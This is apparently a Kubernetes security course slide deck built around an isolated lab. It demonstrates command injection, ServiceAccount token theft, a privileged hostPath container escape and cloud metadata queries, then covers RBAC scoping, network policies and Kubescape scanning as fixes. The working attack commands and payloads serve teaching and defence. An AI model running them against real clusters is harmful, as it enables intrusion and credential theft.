# Kubernetes Security
### Module 3 Week 5 Session 3

**Lab repo**: github.com/roman-cybersteps/k8s-security-lab

---

## What You Will Learn

- The 4C Security Model
- Identity & Access with RBAC
- Pod Security & Network Policies
- OWASP Top 10 for Kubernetes
- One full attack chain, start to finish, on a real (isolated) cluster
- Scanning with Kubescape

---

## Recap

- What are the 4C's in Kubernetes?
- In what ways can Kubernetes be exploited?
- Questions on pre-class material?

---

## Why Kubernetes Security Matters

- **Critical workloads** — protects essential applications and sensitive data
- **Misconfiguration risk** — complex configs create security gaps and vulnerabilities
- **Active target** — widespread adoption makes K8s a prime target for attacks
- **Cascading breaches** — incidents spread fast, causing wide compromise

**Example incident**: Chaos Mesh critical GraphQL flaws enable RCE and full Kubernetes cluster takeover — The Hacker News

---

## Challenges with K8s Security

- **Ephemeral workloads** — constant pod creation/termination makes traditional monitoring hard
- **Dynamic network topologies** — rapidly changing connections create complex attack surfaces
- **Shared kernel vulnerabilities** — a compromised container can impact others on the same host
- **Infrastructure as Code risks** — a misconfig in IaC propagates across the entire cluster instantly

---

## The 4C Security Model

- **Cloud** — the physical/virtual foundation
- **Cluster** — control plane, nodes, API
- **Container** — runtime, images, environment
- **Code** — logic, dependencies, secrets

**If an attacker compromises the Cloud layer, can our RBAC settings stop them?**

---

## The Foundation Principle

**No.** A compromise at a lower layer (Cloud) usually grants full control over the layers above it (Cluster, Container, Code), regardless of internal settings.

Today's lab compromises the **Code** layer first, and you'll watch it climb all the way up to the **Cluster/node** layer in one continuous chain.

---

## Assume Breach: We Are Inside a Pod

*"A vulnerable web application gives an attacker command execution inside its container. The attacker is now inside the Kubernetes environment."*

**What would you investigate first?** Think about it before the next slide — we're about to do this for real, not hypothetically.

---

## The Attacker's Roadmap

1. Where am I? What namespace am I in?
2. What other services exist inside the cluster? Can I reach them?
3. What identity does this Pod have? What can that identity do?
4. Can I reach the node or cloud environment?

This is the roadmap for today's lab. Every step below is one of these questions, answered live.

---

## Live Lab: The Cluster Health Dashboard

Repo: `github.com/roman-cybersteps/k8s-security-lab` — run `./setup.sh`, then:

```bash
kubectl port-forward svc/cluster-health-dashboard 5000:5000 -n default
open http://localhost:5000
```

A fake internal diagnostics tool. It takes a hostname and pings it — and passes that hostname straight into a shell command, unsanitized. This is a real vulnerability, not a simulated one.

---

## Step 1: Get Command Execution

```bash
curl -s -G "http://localhost:5000/ping" \
  --data-urlencode "host=127.0.0.1; whoami; id"
```

The `;` ends the ping command and starts a new one. Whatever you put after it runs on the server, inside the Pod, and its output comes back in the HTTP response.

**Try it yourself first** — before the next slide, see what else you can learn about this Pod using the same technique (`hostname`, `env`, `cat /etc/resolv.conf`).

---

## Step 2: Recon From Inside

```bash
curl -s -G "http://localhost:5000/ping" \
  --data-urlencode "host=127.0.0.1; cat /var/run/secrets/kubernetes.io/serviceaccount/namespace"
# → default   (tested)
```

Kubernetes automatically injects a ServiceAccount's credentials and DNS config into every Pod. This gives an attacker immediate context about the cluster, for free, before they've done anything clever.

---

## Step 3: Steal the ServiceAccount Token

```bash
curl -s -G "http://localhost:5000/ping" \
  --data-urlencode "host=127.0.0.1; cat /var/run/secrets/kubernetes.io/serviceaccount/token"
```

**Tested, real output**: a full JWT bearer token comes back in the response. This is the Pod's Kubernetes identity, sitting on disk, and the injection just read it straight off the filesystem.

*(This is exactly the file from the "Secrets in the Filesystem" slide — `/var/run/secrets/kubernetes.io/serviceaccount/{token,namespace,ca.crt}`. We're not looking at it in the abstract anymore.)*

---

## RBAC: Roles, ClusterRoles & Bindings

- **Role** — permissions inside one namespace
- **ClusterRole** — permissions across the entire cluster
- **RoleBinding** — assigns a Role to a user/group/service account, namespace-scoped
- **ClusterRoleBinding** — assigns a ClusterRole cluster-wide
- **Verbs** (actions): `get`, `list`, `create`, `delete`
- **Resources** (objects): `pods`, `secrets`, `configmaps`

The question that matters now: **what is this stolen token actually allowed to do?**

---

## Step 4: Use the Stolen Token Against the API Server

Still through the same injection — no separate shell, no kubectl:

```bash
curl -s -G "http://localhost:5000/ping" --data-urlencode \
  'host=127.0.0.1; TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces'
```

**Tested, real output**: returns every namespace in the cluster — `default`, `demo`, `database`, `tenant-1`, `tenant-2`, `kube-system`... This small diagnostics app's identity was never supposed to see any of that.

---

## Why Does It Have This Much Access?

This app's ServiceAccount was bound to a ClusterRole meant for a CI/CD deploy tool:

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: webapp-sa-role
rules:
  - apiGroups: [""]
    resources: ["namespaces", "pods", "secrets"]
    verbs: ["get", "list"]
  - apiGroups: [""]
    resources: ["pods"]
    verbs: ["create"]
```

`get`/`list` on `secrets` and `pods` cluster-wide, **plus `create` on pods** — a real diagnostics app needs none of this. This exact pattern (reusing a powerful identity for a small unrelated workload) is how real incidents like this happen.

---

## Pop Quiz

Same shape of bug, different framing — an app is supposed to read pods only in its own namespace:

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: app-reader
rules:
- apiGroups: [""]
  resources: ["pods", "secrets"]
  verbs: ["get", "list"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: app-reader-binding
subjects:
- kind: ServiceAccount
  name: app-sa
  namespace: default
roleRef:
  kind: ClusterRole
  name: app-reader
```

**What is the main security risk?**
A) The ClusterRoleBinding gives cluster-wide access to pods and secrets
B) The verbs should include "watch" for proper monitoring
C) The ServiceAccount should be in a different namespace
D) The ClusterRole should specify namespace restrictions

---

## Pop Quiz — Proven Live (repo: `manifests/03-rbac-popquiz-live/`)

Deployed the exact config above, plus a "victim" secret in a totally unrelated `database` namespace:

```bash
kubectl auth can-i get secrets --as=system:serviceaccount:default:app-sa -n database
# → yes   (tested — app-sa lives in "default", this namespace has nothing to do with it)

kubectl get secret db-credentials -n database -o jsonpath='{.data.password}' \
  --as=system:serviceaccount:default:app-sa | base64 -d
# → SuperSecretProdPassword123!   (tested)
```

**Answer: A.** Not hypothetical — a `ClusterRole` bound this broadly really does leak a password from a namespace the app has no business touching.

**The fix**, also tested: swap for a namespaced `Role`/`RoleBinding` scoped to `pods` only in `default` → the same `get secrets -n database` call returns `no`, and the actual `kubectl get secret` call returns `Forbidden`.

---

## Step 5: The Escalation — Create a Privileged Pod

The stolen token can `create pods` cluster-wide. So let's use it to create one that gets us onto the node — still through the same web injection:

```bash
curl -s -G "http://localhost:5000/ping" --data-urlencode \
  'host=127.0.0.1; TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); curl -sk -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d @/opt/privileged-pod.json https://kubernetes.default.svc/api/v1/namespaces/default/pods'
```

**Tested, real output**: the API server confirms the Pod `pwned-via-rbac` was created — `"uid": "752ac953-..."`. The vulnerable app's own low privilege never mattered once it had `create pods`.

---

## Pod Security: What That Privileged Pod Actually Contains

```json
{
  "spec": {
    "containers": [{
      "securityContext": { "privileged": true },
      "volumeMounts": [{ "name": "hostroot", "mountPath": "/host" }]
    }],
    "volumes": [{ "name": "hostroot", "hostPath": { "path": "/" } }]
  }
}
```

- **`privileged: true`** — full access to host devices
- **`hostPath: /`** — the entire node filesystem, mounted read-write, inside the container
- **Capabilities** — privileged implicitly grants everything, including things like `NET_ADMIN`

This is a container escape by design, not by exploit — nothing here is a bug in Kubernetes, it's exactly what these two settings are documented to do.

---

## Step 6: Confirm the Node Is Actually Compromised

```bash
kubectl wait --for=condition=Ready pod/pwned-via-rbac -n default --timeout=60s
minikube ssh -- cat /PWNED-BY-LAB.txt
```

**Tested, real output:**
```
This file was written to the underlying NODE filesystem by a Pod created using
a stolen ServiceAccount token. Container escape via privileged + hostPath.
```

That file was written by a container, and read back from the actual VM, outside Kubernetes entirely, via `minikube ssh`. **Full chain, in one sentence: a command-injection bug in a small internal web app became node-level compromise, entirely because of one over-broad RBAC grant.**

---

## Demo: Privileged vs. Restricted, Side by Side (repo: `manifests/06-pod-security/`)

Same technique, isolated from the attack chain so you can see the mechanism cleanly:

```bash
# restricted-pod: no hostPath, dropped capabilities, non-root
kubectl exec restricted-pod -n default -- sh -c 'echo test > /etc/shadow'
# → Permission denied   (tested)

# dangerous-pod: privileged + hostPath
kubectl exec dangerous-pod -n default -- sh -c 'echo hi > /host/DEMO-PROOF.txt'
minikube ssh -- cat /DEMO-PROOF.txt
# → hi   (tested — landed on the real node)
```

Two pods, one flag (`privileged: true`) and one volume mount (`hostPath`) apart. That's the entire difference between "contained" and "not contained."

---

## Network Policies: Micro-Segmentation

- **Default**: flat network — all-to-all, no restrictions
- **Solution**: label-based pod firewalls
- **Ingress** (inbound) & **Egress** (outbound)
- "Zero trust" inside the cluster

**If internal services aren't exposed to the internet, can an attacker inside the cluster still reach them?**

---

## Demo: Flat Network, By Default (repo: `manifests/04-network-policy/`)

Two unrelated tenants, no policy applied:

```bash
kubectl -n tenant-1 exec <pod> -- wget -qO- http://nginx.tenant-2.svc.cluster.local:8080
```

**Tested result**: full HTML response, immediately. Nothing stopped it. Kubernetes gives every service a predictable DNS name (`servicename.namespace.svc.cluster.local`) reachable from anywhere in the cluster by default — namespaces are a naming boundary, not a security one.

---

## Demo: Default Deny, Then Scoped Allow

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
  namespace: tenant-2
spec:
  podSelector: {}
  policyTypes: ["Ingress", "Egress"]
```

```bash
kubectl apply -f np-default-deny.yaml
kubectl -n tenant-1 exec <pod> -- wget -qO- -T 5 http://nginx.tenant-2.svc.cluster.local:8080
# → wget: download timed out   (tested)
```

Then a scoped allow rule restores just the one path (tenant-1 → tenant-2), while a third unrelated namespace stays blocked — tested and confirmed both ways. *(Requires a CNI that enforces NetworkPolicy — Calico here; minikube's default CNI silently ignores these objects.)*

---

## OWASP Top 10 for Kubernetes

Reference: OWASP Kubernetes Top Ten

We've now hit several of these directly: broken authentication/authorization (RBAC), lack of network segmentation, sensitive data exposure (the stolen token, the leaked secret), and misconfigured cluster components (privileged pods).

---

## The "Metadata" Attack Vector

- Cloud nodes run an Instance Metadata Service (IMDS)
- IP: `169.254.169.254`
- Pods can often reach this IP by default
- Can reveal cloud IAM roles and credentials — a second identity, on top of the ServiceAccount

---

## Demo: Secret Hunting & IMDS (repo: `manifests/05-metadata/`)

Minikube isn't an Azure VM, so `169.254.169.254` won't answer here. We built a local stand-in serving Azure-IMDS-shaped JSON at the same paths — same command shape works verbatim on real AKS, just swap the hostname.

```bash
# Real AKS:      curl -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
# Local (tested):
curl -s -H "Metadata:true" "http://mock-azure-imds/metadata/instance?api-version=2021-02-01"
# → {"compute":{"azEnvironment":"AzurePublicCloud","location":"westeurope", ...}}
```

**Note**: whether this is actually exploitable on your real AKS environment depends on your workload identity configuration — only the local simulation has been verified here, not real Azure infrastructure.

---

## Static Analysis with Kubescape

- Automated scanning of YAML files
- Finds: root usage, no resource limits, privileged flags, plaintext credentials
- The point of this slide: **everything we just did by hand, live, could have been caught before a single manifest was ever applied.**

---

## Demo: Scanning with Kubescape — Shift Left

```bash
kubescape scan framework nsa .
```

**Real output, run against this entire repo:**
```
Controls: 20   Passed: ~10   Failed: ~10
High    Applications credentials in configuration files   1/8 resources   88%
High    Privileged container                              2/7 resources   71%
High    Ensure CPU/memory limits are set                   0%
Medium  Automatic mapping of service account               22%
Resource Summary: 58.11%
```

It flagged the **exact same plaintext secret** from the pop quiz, and the **exact same privileged pods** from the escalation demo — automatically, with no hints. If this scan had been wired into CI before any of today's manifests were deployed, most of this lab wouldn't have been possible.

---

## Summary

- **4C model** prioritizes layered defense — a Code-layer bug climbed all the way to node compromise today
- **RBAC** manages control-plane access — and over-broad grants are the single biggest lever an attacker gets
- **Pod Security** (`privileged`, `hostPath`) is the difference between "contained" and "game over"
- **Network Policies** isolate "east-west" traffic — flat by default, not by accident
- Watch out for **tokens** (`/var/run/secrets/.../token`) and **metadata** (`169.254.169.254`)
- **Kubescape** (or any static scanner) would have caught nearly everything in this lab before deployment

---

## Any Questions?

---

# Kubernetes Security
### Module 3 Week 5 Session 3

Lab repo: **github.com/roman-cybersteps/k8s-security-lab**

Thanks, and enjoy the practice!
